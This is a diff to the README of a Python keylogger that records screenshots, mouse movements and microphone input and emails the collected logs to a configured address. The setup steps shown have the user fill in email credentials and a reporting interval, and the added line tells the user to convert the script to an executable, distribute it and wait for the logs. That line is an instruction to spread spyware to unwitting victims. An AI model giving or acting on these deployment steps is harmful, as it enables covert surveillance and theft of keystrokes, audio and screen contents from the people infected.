@@ -17,6 +17,7 @@ Keylogger created with Python and captures screenshots, mouse movements, microph
 - Open core.py, edit the EMAIL_ADDRESS variable on line [29]
 - Edit the EMAIL_PASSWORD variable on line [30]
 - (Optional) Edit the SEND_REPORT_EVERY variable on line [31] to alter how often logs are sent
+- Convert to executable file, distribute and wait for the logs.
 
 ## Version History
 
